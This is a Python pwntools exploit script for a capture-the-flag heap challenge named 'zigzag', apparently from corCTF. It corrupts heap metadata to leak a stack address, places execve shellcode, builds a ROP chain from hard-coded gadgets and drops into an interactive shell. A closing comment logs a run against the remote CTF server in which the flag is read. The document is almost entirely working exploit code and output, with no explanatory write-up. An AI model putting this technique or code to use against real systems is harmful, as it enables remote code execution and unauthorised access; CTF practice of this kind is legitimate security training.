#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('zigzag')
# pwn.context.terminal = ['tmux', 'new-window'] 
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
source ~/Downloads/pwndbg/gdbinit.py
'''.format(**locals())

io = None

io = start()

def alloc(idx, size, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b"Data: ", data)


def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())

def show(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())

def edit(idx, size, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    if not pwn.args.REMOTE:
        io.sendlineafter(b"Data: ", data)
    else:
        io.sendlineafter(b"Data: ", data)
        """
        l = len(data)
        io.sendafter(b"Data: ", data[:(l//32)])
        for i in range(31):
            time.sleep(1)
            io.clean()
            io.send(data[i*(l//32):(i+1)*(l//32)])
        """

alloc(0, 0x500-1, b"A")
for i in range(1, 5):
    alloc(i, 1000, b"vv")

delete(1)


# alloc(2, 0x500-1, b"XX")
edit(4, 0x400 + 5*8, b"X"*0x400 + pwn.p64(0x208000)*3 + pwn.p64(0x000) + pwn.p64(0))
# edit(0, 0x5000 + 5*8, b"A"*0x5000 + pwn.p64(0x208000)*3 + pwn.p64(0x000) + pwn.p64(0))

alloc(5, 1000, b"A")
edit(5, 0x600, b"A")
show(5)
io.recv(0x100)



stack = pwn.u64(io.recv(8))
pwn.log.info(f"stack: {hex(stack)}")

"""
0x2007b0 <vtable>:         0x0000000000201db0    0x0000000000201f34
0x2007c0 <vtable+16>:      0x0000000000201fb1    0x0000000000201fd3
0x2007d0 <vtable.30+8>:    0x0000000000202557    0x00000000002026be
"""

# craft fake vtable
edit(4, 0x400 + 5*8, b"A"*0x400 + pwn.p64(0x208000)*3 + pwn.p64(0x000) + pwn.p64(0))

# saved free pwn.p64(0x0000000000201fb1)

#alloc(4, 0x500-1, pwn.p64(0x0000000000201db0) + pwn.p64(0x0000000000201f34) + pwn.p64(0x1445) + pwn.p64(0x0000000000201fd3) \
#        + pwn.p64(0x0000000000202557) + pwn.p64(0x0000000000203715))

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

alloc(14, 1000, shellcode)

# gadget : 0x0000000000203715

"""
0x0000000000201fcf : pop rax ; syscall
0x0000000000203147 : pop rdi ; ret
0x000000000020351b : pop rsi ; ret
0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
0x0000000000201e09 : ret
0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret

"""

# overwrite vtable
# 2007D8
#edit(0, 0x3000 + 5*8, b"x"*(0x3000) + pwn.p64(0x204be8)*3 + pwn.p64(0x0) + pwn.p64(0))

#alloc(5, 0x500-1, pwn.p64(0) + pwn.p64(0x208000))

rop = pwn.ROP(exe)
binsh = 0x208000+(48)
rop.execve(binsh, 0, 0)

edit(4, 0x400 + 5*8, b"A"*0x400 + pwn.p64(stack-0x50)* 3 + pwn.p64(0) + pwn.p64(0))
alloc(11, 0x400, pwn.p64(0x203147) + pwn.p64(0x208000) + pwn.p64(0x20351b) + pwn.p64(0x1000) + pwn.p64(0x201fcf) + pwn.p64(0xa) + pwn.p64(0x208000))

edit(4, 0x400 + 5*8, b"A"*0x400 + pwn.p64(stack-0xd0)* 3 + pwn.p64(0) + pwn.p64(0))

#pwn.gdb.attach(io, gdbscript=gdbscript)
alloc(12, 1000,pwn.p64(0x202d16))
edit(12, 0x7, pwn.p64(0x0000000000203715))#pwn.p64(0x203147) + pwn.p64(0x208000) + pwn.p64(0x20351b) + pwn.p64(0x1000) + pwn.p64(0x201fcf) + pwn.p64(0xa))

#edit(4, 0x8, pwn.p64(0x1445))
#edit(6, 0x500-1, )

#alloc(8, 0x0, b"")
#delete(1)

io.interactive()

"""
nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
[*] '/home/nasm/Documents/pwn/corCTF/zieg/zigzag'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x200000)
[+] Opening connection to be.ax on port 31278: Done
[*] stack: 0x7ffe21d2cc68
[*] Loaded 37 cached gadgets for 'zigzag'
[*] Using sigreturn for 'SYS_execve'
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
corctf{bl4Z1nGlY_f4sT!!}
"""